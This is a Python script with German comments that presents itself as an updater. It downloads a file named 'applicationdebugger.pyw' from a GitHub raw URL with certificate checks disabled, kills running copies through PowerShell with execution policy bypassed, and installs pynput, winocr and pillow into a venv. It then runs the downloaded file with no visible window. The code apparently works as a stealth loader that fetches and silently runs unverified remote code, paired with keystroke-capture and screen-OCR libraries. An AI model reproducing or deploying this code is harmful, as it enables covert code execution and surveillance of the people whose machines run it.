import ssl
import sys
import os
import time
import urllib.request
import subprocess
import shutil

# ────────────────────────────────────────────────
# KONFIGURATION
FILE_NAME = "applicationdebugger.pyw"  # Name der Hauptdatei deiner Anwendung
UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/python/refs/heads/main/src/" + FILE_NAME

from pathlib import Path

SCRIPT_PATH = Path(__file__).resolve()
SCRIPT_DIR  = SCRIPT_PATH.parent

BASE_DIR = SCRIPT_DIR

APP_PATH = os.path.join(BASE_DIR, FILE_NAME)

# venv
VENV_DIR = os.path.join(BASE_DIR, ".venv")
VENV_PY = os.path.join(VENV_DIR, "Scripts", "python.exe")
VENV_PYW = os.path.join(VENV_DIR, "Scripts", "pythonw.exe")

IS_WINDOWS = True


# ────────────────────────────────────────────────
def _no_window_flags() -> int:
    """Windows: kein Konsolenfenster, sonst 0"""
    try:
        return subprocess.CREATE_NO_WINDOW  # type: ignore[attr-defined]
    except Exception:
        return 0


# ────────────────────────────────────────────────
def kill_running_main():
    """
    Beendet Prozesse, deren CommandLine auf APP_PATH zeigt.
    (Zuverlässiger als taskkill /IM applicationdebugger.pyw)
    """
    try:
        # PowerShell via CIM: matcht CommandLine, stoppt Prozess
        ps = (
            "powershell -NoProfile -ExecutionPolicy Bypass -Command "
            f"\"Get-CimInstance Win32_Process | "
            f"Where-Object {{ $_.CommandLine -like '*{APP_PATH}*' }} | "
            f"ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force }}\""
        )
        subprocess.run(
            ps,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=_no_window_flags(),
        )
        time.sleep(1)
    except Exception:
        pass


# ────────────────────────────────────────────────
def download_update():
    """Lädt die neue Version herunter (als .new)"""
    temp_path = APP_PATH + ".new"
    try:
        context = ssl._create_unverified_context()
        req = urllib.request.Request(UPDATE_URL)
        req.add_header("Pragma", "no-cache")
        with urllib.request.urlopen(req, timeout=15, context=context) as resp:
            if getattr(resp, "status", 200) != 200:
                return None
            data = resp.read()

        os.makedirs(BASE_DIR, exist_ok=True)
        with open(temp_path, "wb") as f:
            f.write(data)
        return temp_path
    except Exception:
        if os.path.exists(temp_path):
            try:
                os.unlink(temp_path)
            except Exception:
                pass
        return None


# ────────────────────────────────────────────────
def apply_update(temp_file: str) -> bool:
    """Ersetzt die alte Datei mit der neuen (mit Retries + kill)"""
    attempts = 5
    for i in range(attempts):
        try:
            if os.path.exists(APP_PATH):
                try:
                    os.remove(APP_PATH)
                except PermissionError:
                    kill_running_main()
                    time.sleep(1 + i)

            shutil.move(temp_file, APP_PATH)

            # optional: ausführbar markieren (schadet nicht)
            try:
                os.chmod(APP_PATH, 0o755)
            except Exception:
                pass

            return True

        except PermissionError:
            kill_running_main()
            time.sleep(1 + i)
        except Exception:
            return False
    return False


# ────────────────────────────────────────────────
def try_install_venv() -> bool:
    """
    Erstellt venv, falls nicht vorhanden/kaputt.
    Wichtig: auf VENV_PY prüfen, nicht nur auf Ordner.
    """
    if os.path.exists(VENV_PY) or os.path.exists(VENV_PYW):
        return True

    os.makedirs(BASE_DIR, exist_ok=True)

    result = subprocess.run(
        [sys.executable, "-m", "venv", VENV_DIR],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=_no_window_flags(),
    )

    if result.returncode == 0 and (os.path.exists(VENV_PY) or os.path.exists(VENV_PYW)):
        print("Virtual environment created.")
        return True

    print("Failed to create virtual environment.")
    return False


# ────────────────────────────────────────────────
def venv_has(module: str) -> bool:
    """Prüft, ob ein Modul in der venv importierbar ist"""
    exe = VENV_PY if os.path.exists(VENV_PY) else VENV_PYW
    r = subprocess.run(
        [exe, "-c", f"import {module}"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=_no_window_flags(),
    )
    return r.returncode == 0

packets = ["winocr", "pillow", "pynput", "numpy"]
# ────────────────────────────────────────────────
def install_dependencies():
    """
    Installiert requests in der venv, falls nicht vorhanden.
    WICHTIG: Check & Install laufen über venv-python, nicht über den Updater-Python.
    """
    exe = VENV_PY if os.path.exists(VENV_PY) else VENV_PYW 

    for packet in packets:
        if venv_has(packet):
            print("Dependencie already installed: " + packet)
            continue

        print("Installing dependencies into venv...")

        # pip sicherstellen/aktualisieren
        subprocess.run(
            [exe, "-m", "pip", "install", "--upgrade", "pip"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=_no_window_flags(),
        )

        result = subprocess.run(
            [exe, "-m", "pip", "install", packet],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=_no_window_flags(),
        )

        if result.returncode == 0 and venv_has(packet):
            print("Dependencies installed successfully (in venv).")
        else:
            print("Failed to install dependencies into venv.")


# ────────────────────────────────────────────────
def start_main_app() -> bool:
    """Startet die Hauptanwendung unter Windows aus der venv (pythonw bevorzugt)"""
    if not os.path.exists(APP_PATH):
        print("APP_PATH nicht gefunden:", APP_PATH)
        return False

    exe = VENV_PYW if os.path.exists(VENV_PYW) else VENV_PY

    try:
        subprocess.Popen(
            [exe, APP_PATH],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=_no_window_flags(),
        )
        return True
    except Exception as e:
        print("Startfehler:", e)
        return False


# ────────────────────────────────────────────────
def main():
    os.makedirs(BASE_DIR, exist_ok=True)

    # Hauptanwendung beenden
    kill_running_main()

    # Update herunterladen & anwenden
    new_file = download_update()
    if new_file:
        ok = apply_update(new_file)
        if not ok:
            print("Update konnte nicht angewendet werden.")

    # venv erstellen und Abhängigkeiten installieren
    if try_install_venv():
        install_dependencies()
        print("Virtual environment is ready.")
    else:
        print("Failed to create virtual environment. Starte trotzdem (falls möglich).")

    # Hauptanwendung starten
    started = start_main_app()
    if not started:
        print("Konnte Hauptanwendung nicht starten.")

    sys.exit(0)


# ────────────────────────────────────────────────
if __name__ == "__main__":
    main()
